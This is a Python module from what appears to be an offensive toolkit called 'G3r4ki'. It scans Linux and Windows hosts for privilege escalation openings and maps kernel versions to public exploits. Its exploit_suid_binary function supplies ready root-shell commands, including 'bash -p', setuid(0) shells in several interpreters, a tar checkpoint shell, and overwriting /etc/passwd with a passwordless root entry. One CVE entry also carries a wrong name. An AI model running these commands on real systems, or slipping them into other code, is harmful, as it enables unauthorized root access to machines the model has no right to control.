"""
G3r4ki Privilege Escalation Module

This module provides privilege escalation techniques for various platforms.
"""

import subprocess
import platform
import logging
import os
import re
import json
from typing import Dict, List, Optional, Union, Any

# Setup logging
logger = logging.getLogger("g3r4ki.exploitation.post.privilege_escalation")

class PrivilegeEscalationException(Exception):
    """Exception for privilege escalation errors"""
    pass

class LinuxPrivilegeEscalation:
    """
    Linux Privilege Escalation class
    
    This class provides methods to identify and exploit privilege escalation
    vectors on Linux systems.
    """
    
    def __init__(self):
        """Initialize the Linux privilege escalation scanner"""
        self.suid_paths = [
            "/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin",
            "/usr/local/sbin", "/opt", "/snap"
        ]
        
        # GTFO bins with SUID capabilities
        # https://gtfobins.github.io/#+suid
        self.known_suid_exploits = {
            "aria2c": "aria2c can be used to download files as the SUID owner",
            "arp": "arp can be used to read files owned by SUID owner",
            "ash": "ash can execute commands with SUID privileges",
            "bash": "bash can execute commands with SUID privileges",
            "busybox": "busybox can execute commands with SUID privileges",
            "cat": "cat can be used to read files owned by SUID owner",
            "chmod": "chmod can modify file permissions",
            "chown": "chown can modify file ownership",
            "cp": "cp can be used to copy owned files to anywhere",
            "csh": "csh can execute commands with SUID privileges",
            "curl": "curl can be used to download files as the SUID owner",
            "dash": "dash can execute commands with SUID privileges",
            "date": "date can be used to read files owned by SUID owner",
            "dd": "dd can be used to read/write to files",
            "env": "env can run commands as SUID owner via env /bin/sh -p",
            "find": "find can execute commands with SUID privileges via -exec",
            "ksh": "ksh can execute commands with SUID privileges",
            "less": "less can execute commands with SUID privileges",
            "more": "more can execute commands with SUID privileges",
            "nano": "nano can read/write to files as SUID owner",
            "node": "node can execute JavaScript as SUID owner",
            "perl": "perl can execute Perl code with SUID privileges",
            "php": "php can execute PHP code with SUID privileges",
            "python": "python can execute Python code with SUID privileges",
            "python2": "python2 can execute Python code with SUID privileges",
            "python3": "python3 can execute Python code with SUID privileges",
            "ruby": "ruby can execute Ruby code with SUID privileges",
            "run-parts": "run-parts can execute scripts with SUID privileges",
            "sed": "sed can read files owned by SUID owner",
            "tar": "tar can be used to manipulate files with SUID privileges",
            "vim": "vim can read/write to files as SUID owner",
            "wget": "wget can download files as the SUID owner",
            "zsh": "zsh can execute commands with SUID privileges"
        }
        
        # Kernel exploits mapped to vulnerable versions
        self.known_kernel_exploits = {
            "CVE-2016-5195": {
                "name": "Dirty COW",
                "description": "Allows local users to gain write access to read-only memory mappings",
                "versions": ["2.6.22", "2.6.23", "2.6.24", "2.6.25", "2.6.26", "2.6.27", "2.6.28", "2.6.29", "2.6.30", "2.6.31", "2.6.32", "2.6.33", "2.6.34", "2.6.35", "2.6.36", "2.6.37", "2.6.38", "2.6.39", "3.0", "3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.8", "3.9", "3.10", "3.11", "3.12", "3.13", "3.14", "3.15", "3.16", "3.17", "3.18", "3.19", "4.0", "4.1", "4.2", "4.3", "4.4", "4.5", "4.6", "4.7", "4.8"],
                "exploit_url": "https://www.exploit-db.com/exploits/40616"
            },
            "CVE-2016-4557": {
                "name": "Double-free in Linux kernel",
                "description": "Allows local attackers to obtain root privileges",
                "versions": ["4.5", "4.6"],
                "exploit_url": "https://www.exploit-db.com/exploits/39772"
            },
            "CVE-2017-16995": {
                "name": "Linux kernel < 4.14.11 - DCCP DoubleFree",
                "description": "Allows local attackers to gain root privileges",
                "versions": ["4.9", "4.10", "4.11", "4.12", "4.13", "4.14"],
                "exploit_url": "https://www.exploit-db.com/exploits/44301"
            },
            "CVE-2016-9793": {
                "name": "Linux kernel < 4.8.12 - SO_SNDBUFFORCE / SO_RCVBUFFORCE",
                "description": "Allows local attackers to gain root privileges",
                "versions": ["3.0", "3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.8", "3.9", "3.10", "3.11", "3.12", "3.13", "3.14", "3.15", "3.16", "3.17", "3.18", "3.19", "4.0", "4.1", "4.2", "4.3", "4.4", "4.5", "4.6", "4.7", "4.8"],
                "exploit_url": "https://www.exploit-db.com/exploits/41995"
            }
        }
    
    def find_suid_files(self) -> List[Dict[str, Any]]:
        """
        Find SUID files on the system
        
        Returns:
            List of dictionaries with SUID file information
        """
        suid_files = []
        
        # Build find command
        command = ["find"]
        command.extend(self.suid_paths)
        command.extend(["-type", "f", "-perm", "-4000", "-ls"])
        
        try:
            result = subprocess.run(
                command,
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Parse the output
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 11:
                    perms = parts[2]
                    user = parts[4]
                    group = parts[5]
                    size = parts[6]
                    filepath = " ".join(parts[10:])
                    
                    filename = os.path.basename(filepath)
                    
                    # Check if it's a known exploit
                    exploit_info = self.known_suid_exploits.get(filename, "")
                    
                    suid_files.append({
                        "file": filepath,
                        "filename": filename,
                        "permissions": perms,
                        "owner": user,
                        "group": group,
                        "size": size,
                        "is_exploitable": filename in self.known_suid_exploits,
                        "exploit_info": exploit_info
                    })
            
            return suid_files
            
        except Exception as e:
            logger.error(f"Error finding SUID files: {str(e)}")
            return []
    
    def check_kernel_version(self) -> Dict[str, Any]:
        """
        Check kernel version for known vulnerabilities
        
        Returns:
            Dictionary with kernel information and potential exploits
        """
        result = {
            "kernel_version": "",
            "vulnerable_to": []
        }
        
        try:
            kernel_version = platform.release()
            result["kernel_version"] = kernel_version
            
            # Extract major and minor version
            version_parts = kernel_version.split(".")
            major = version_parts[0]
            minor = version_parts[1] if len(version_parts) > 1 else "0"
            
            # Check against known vulnerable versions
            for cve_id, exploit_info in self.known_kernel_exploits.items():
                for vuln_version in exploit_info["versions"]:
                    vuln_parts = vuln_version.split(".")
                    vuln_major = vuln_parts[0]
                    vuln_minor = vuln_parts[1] if len(vuln_parts) > 1 else "0"
                    
                    if major == vuln_major and minor == vuln_minor:
                        result["vulnerable_to"].append({
                            "cve_id": cve_id,
                            "name": exploit_info["name"],
                            "description": exploit_info["description"],
                            "exploit_url": exploit_info["exploit_url"]
                        })
            
            return result
            
        except Exception as e:
            logger.error(f"Error checking kernel version: {str(e)}")
            return result
    
    def check_sudo_permissions(self) -> Dict[str, Any]:
        """
        Check sudo permissions for the current user
        
        Returns:
            Dictionary with sudo information
        """
        result = {
            "has_sudo": False,
            "nopasswd_commands": [],
            "sudo_commands": []
        }
        
        try:
            # Check if user can run sudo -l without password
            process = subprocess.run(
                ["sudo", "-l", "-n"],
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            if process.returncode == 0:
                result["has_sudo"] = True
                
                # Parse sudo output
                sudo_output = process.stdout
                
                # Look for NOPASSWD entries
                nopasswd_pattern = r"NOPASSWD:\s+(.+?)$"
                nopasswd_matches = re.finditer(nopasswd_pattern, sudo_output, re.MULTILINE)
                
                for match in nopasswd_matches:
                    commands = match.group(1).strip().split(", ")
                    result["nopasswd_commands"].extend(commands)
                
                # Look for other sudo commands
                sudo_pattern = r"[^P].*:?\s+(.+?)$"
                sudo_matches = re.finditer(sudo_pattern, sudo_output, re.MULTILINE)
                
                for match in sudo_matches:
                    commands = match.group(1).strip().split(", ")
                    for cmd in commands:
                        if cmd not in result["nopasswd_commands"]:
                            result["sudo_commands"].append(cmd)
            
            return result
            
        except Exception as e:
            logger.error(f"Error checking sudo permissions: {str(e)}")
            return result
    
    def check_writable_paths(self) -> List[Dict[str, str]]:
        """
        Check for writable paths in $PATH
        
        Returns:
            List of writable directories in PATH
        """
        writable_paths = []
        
        try:
            # Get PATH
            path_env = os.environ.get("PATH", "")
            paths = path_env.split(":")
            
            for path in paths:
                if not path:
                    continue
                    
                if os.access(path, os.W_OK):
                    writable_paths.append({
                        "path": path,
                        "status": "writable"
                    })
                else:
                    writable_paths.append({
                        "path": path,
                        "status": "not writable"
                    })
            
            return writable_paths
            
        except Exception as e:
            logger.error(f"Error checking writable paths: {str(e)}")
            return []
    
    def check_cron_jobs(self) -> List[Dict[str, Any]]:
        """
        Check for writable cron jobs
        
        Returns:
            List of cron jobs with write permissions
        """
        cron_jobs = []
        
        try:
            # Check system cron directories
            cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.monthly", "/etc/cron.weekly"]
            
            for cron_dir in cron_dirs:
                if not os.path.exists(cron_dir):
                    continue
                    
                for filename in os.listdir(cron_dir):
                    filepath = os.path.join(cron_dir, filename)
                    
                    if os.path.isfile(filepath):
                        writable = os.access(filepath, os.W_OK)
                        readable = os.access(filepath, os.R_OK)
                        
                        if readable or writable:
                            content = ""
                            if readable:
                                try:
                                    with open(filepath, 'r') as f:
                                        content = f.read()
                                except:
                                    content = "Error reading file"
                            
                            cron_jobs.append({
                                "file": filepath,
                                "writable": writable,
                                "readable": readable,
                                "content": content
                            })
            
            # Check /etc/crontab
            crontab_file = "/etc/crontab"
            if os.path.exists(crontab_file):
                writable = os.access(crontab_file, os.W_OK)
                readable = os.access(crontab_file, os.R_OK)
                
                if readable or writable:
                    content = ""
                    if readable:
                        try:
                            with open(crontab_file, 'r') as f:
                                content = f.read()
                        except:
                            content = "Error reading file"
                        
                    cron_jobs.append({
                        "file": crontab_file,
                        "writable": writable,
                        "readable": readable,
                        "content": content
                    })
            
            return cron_jobs
            
        except Exception as e:
            logger.error(f"Error checking cron jobs: {str(e)}")
            return []
    
    def exploit_suid_binary(self, binary: str) -> Dict[str, Any]:
        """
        Provide instructions to exploit a SUID binary
        
        Args:
            binary: Binary name or path
            
        Returns:
            Dictionary with exploitation instructions
        """
        binary_name = os.path.basename(binary)
        
        result = {
            "binary": binary,
            "exploitable": False,
            "instructions": "",
            "commands": []
        }
        
        if binary_name not in self.known_suid_exploits:
            result["instructions"] = f"No known exploitation technique for {binary_name}"
            return result
        
        result["exploitable"] = True
        
        if binary_name == "bash":
            result["instructions"] = "Bash with SUID privileges can be used to get a shell with elevated privileges."
            result["commands"] = [f"{binary} -p"]
        
        elif binary_name == "cp":
            result["instructions"] = "The cp command can be used to overwrite sensitive files."
            result["commands"] = [
                "echo 'root:password:0:0:root:/root:/bin/bash' > /tmp/passwd",
                f"{binary} /tmp/passwd /etc/passwd"
            ]
        
        elif binary_name == "env":
            result["instructions"] = "The env command can be used to execute commands with elevated privileges."
            result["commands"] = [f"{binary} /bin/sh -p"]
        
        elif binary_name == "find":
            result["instructions"] = "The find command can execute arbitrary commands with -exec."
            result["commands"] = [f"{binary} /etc -exec /bin/sh -p \\; -quit"]
        
        elif binary_name in ["python", "python2", "python3"]:
            result["instructions"] = f"The {binary_name} interpreter can be used to execute Python code with elevated privileges."
            result["commands"] = [
                f"{binary} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            ]
        
        elif binary_name == "perl":
            result["instructions"] = "The Perl interpreter can be used to execute Perl code with elevated privileges."
            result["commands"] = [
                f"{binary} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
            ]
        
        elif binary_name == "ruby":
            result["instructions"] = "The Ruby interpreter can be used to execute Ruby code with elevated privileges."
            result["commands"] = [
                f"{binary} -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
            ]
        
        elif binary_name == "php":
            result["instructions"] = "The PHP interpreter can be used to execute PHP code with elevated privileges."
            result["commands"] = [
                f"{binary} -r \"posix_setuid(0); system('/bin/bash');\""
            ]
        
        elif binary_name in ["vim", "nano"]:
            result["instructions"] = f"The {binary_name} editor can read/write to files as the SUID owner."
            result["commands"] = [
                f"{binary} /etc/passwd  # Then add a new user with UID 0",
                f"{binary} /etc/shadow  # Then modify root password"
            ]
        
        elif binary_name in ["less", "more"]:
            result["instructions"] = f"The {binary_name} pager can execute commands with !/bin/bash."
            result["commands"] = [
                f"{binary} /etc/passwd",
                "# Then type '!/bin/sh -p'"
            ]
        
        elif binary_name == "tar":
            result["instructions"] = "The tar command can execute commands with the checkpoint action."
            result["commands"] = [
                "echo '#!/bin/bash' > /tmp/shell.sh",
                "echo 'bash -p' >> /tmp/shell.sh",
                "chmod +x /tmp/shell.sh",
                f"{binary} cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/shell.sh"
            ]
        
        else:
            result["instructions"] = f"The {binary_name} binary can be exploited, but specific commands depend on the system configuration."
            result["exploitable"] = True
        
        return result
    
    def scan_for_privesc_vectors(self) -> Dict[str, Any]:
        """
        Scan the system for privilege escalation vectors
        
        Returns:
            Dictionary with scan results
        """
        results = {
            "suid_files": self.find_suid_files(),
            "kernel_info": self.check_kernel_version(),
            "sudo_permissions": self.check_sudo_permissions(),
            "writable_paths": self.check_writable_paths(),
            "cron_jobs": self.check_cron_jobs()
        }
        
        return results

class WindowsPrivilegeEscalation:
    """
    Windows Privilege Escalation class
    
    This class provides methods to identify and exploit privilege escalation
    vectors on Windows systems.
    """
    
    def __init__(self):
        """Initialize the Windows privilege escalation scanner"""
        self.known_service_exploits = {
            "UsoSvc": "User account with SeImpersonate privileges can exploit this service",
            "bits": "Bits service can be abused for DLL Hijacking"
        }
    
    def check_service_permissions(self) -> List[Dict[str, Any]]:
        """
        Check for services with weak permissions
        
        Returns:
            List of services with weak permissions
        """
        # This method requires PowerShell on Windows
        if platform.system() != "Windows":
            return []
        
        vulnerable_services = []
        
        try:
            # PowerShell command to check service permissions
            ps_cmd = """
            $services = Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"}
            foreach ($service in $services) {
                $path = $service.PathName.Trim('"')
                $name = $service.Name
                $displayName = $service.DisplayName
                $startMode = $service.StartMode
                
                $executablePath = $path.Split(" ")[0].Replace('"', '')
                $folderPath = Split-Path -Path $executablePath -Parent
                
                $acl = Get-Acl $executablePath -ErrorAction SilentlyContinue
                $permissions = $acl.Access | Where-Object {$_.FileSystemRights -match "Modify|FullControl|Write" -and $_.IdentityReference -match "BUILTIN\\\\Users|Everyone|BUILTIN\\\\Power Users|NT AUTHORITY\\\\INTERACTIVE"}
                
                if ($permissions) {
                    $isVulnerable = $true
                } else {
                    $isVulnerable = $false
                }
                
                $folderAcl = Get-Acl $folderPath -ErrorAction SilentlyContinue
                $folderPermissions = $folderAcl.Access | Where-Object {$_.FileSystemRights -match "Modify|FullControl|Write" -and $_.IdentityReference -match "BUILTIN\\\\Users|Everyone|BUILTIN\\\\Power Users|NT AUTHORITY\\\\INTERACTIVE"}
                
                if ($folderPermissions) {
                    $isFolderVulnerable = $true
                } else {
                    $isFolderVulnerable = $false
                }
                
                [PSCustomObject]@{
                    Name = $name
                    DisplayName = $displayName
                    Path = $executablePath
                    StartMode = $startMode
                    ServiceUserIsSystem = $true
                    ExecutableVulnerable = $isVulnerable
                    FolderVulnerable = $isFolderVulnerable
                }
            }
            """
            
            # Execute PowerShell command
            process = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Parse the output
            lines = process.stdout.strip().split("\n")
            header = lines[0].strip().split()
            
            for line in lines[1:]:
                parts = line.strip().split()
                if len(parts) >= 7:
                    service_name = parts[0]
                    display_name = parts[1]
                    executable_path = parts[2]
                    start_mode = parts[3]
                    is_system = parts[4].lower() == "true"
                    exec_vulnerable = parts[5].lower() == "true"
                    folder_vulnerable = parts[6].lower() == "true"
                    
                    if is_system and (exec_vulnerable or folder_vulnerable):
                        exploit_info = self.known_service_exploits.get(service_name, "")
                        
                        vulnerable_services.append({
                            "name": service_name,
                            "display_name": display_name,
                            "path": executable_path,
                            "start_mode": start_mode,
                            "executable_vulnerable": exec_vulnerable,
                            "folder_vulnerable": folder_vulnerable,
                            "exploit_info": exploit_info if exploit_info else "Service might be vulnerable to DLL hijacking or executable replacement"
                        })
            
            return vulnerable_services
            
        except Exception as e:
            logger.error(f"Error checking service permissions: {str(e)}")
            return []
    
    def check_installed_programs(self) -> List[Dict[str, Any]]:
        """
        Check for vulnerable installed programs
        
        Returns:
            List of installed programs with potential vulnerabilities
        """
        # This method requires PowerShell on Windows
        if platform.system() != "Windows":
            return []
        
        installed_programs = []
        
        try:
            # PowerShell command to list installed programs
            ps_cmd = """
            $programs = Get-WmiObject -Class Win32_Product
            foreach ($program in $programs) {
                [PSCustomObject]@{
                    Name = $program.Name
                    Version = $program.Version
                    Vendor = $program.Vendor
                    InstallLocation = $program.InstallLocation
                }
            }
            """
            
            # Execute PowerShell command
            process = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Parse the output
            lines = process.stdout.strip().split("\n")
            
            for line in lines[1:]:  # Skip header
                parts = line.strip().split(None, 3)
                if len(parts) >= 3:
                    name = parts[0]
                    version = parts[1]
                    vendor = parts[2]
                    install_location = parts[3] if len(parts) > 3 else ""
                    
                    installed_programs.append({
                        "name": name,
                        "version": version,
                        "vendor": vendor,
                        "install_location": install_location
                    })
            
            return installed_programs
            
        except Exception as e:
            logger.error(f"Error checking installed programs: {str(e)}")
            return []
    
    def scan_for_privesc_vectors(self) -> Dict[str, Any]:
        """
        Scan the system for privilege escalation vectors
        
        Returns:
            Dictionary with scan results
        """
        results = {
            "vulnerable_services": self.check_service_permissions(),
            "installed_programs": self.check_installed_programs()
        }
        
        return results

# Create singleton instances
linux_privesc = LinuxPrivilegeEscalation()
windows_privesc = WindowsPrivilegeEscalation()

def scan_linux_privesc() -> Dict[str, Any]:
    """
    Scan for Linux privilege escalation vectors
    
    Returns:
        Dictionary with scan results
    """
    return linux_privesc.scan_for_privesc_vectors()

def scan_windows_privesc() -> Dict[str, Any]:
    """
    Scan for Windows privilege escalation vectors
    
    Returns:
        Dictionary with scan results
    """
    return windows_privesc.scan_for_privesc_vectors()

def exploit_suid_binary(binary: str) -> Dict[str, Any]:
    """
    Provide instructions to exploit a SUID binary
    
    Args:
        binary: Binary name or path
        
    Returns:
        Dictionary with exploitation instructions
    """
    return linux_privesc.exploit_suid_binary(binary)

def scan_for_privesc_vectors() -> Dict[str, Any]:
    """
    Scan for privilege escalation vectors based on current platform
    
    Returns:
        Dictionary with scan results
    """
    if platform.system() == "Windows":
        return scan_windows_privesc()
    else:
        return scan_linux_privesc()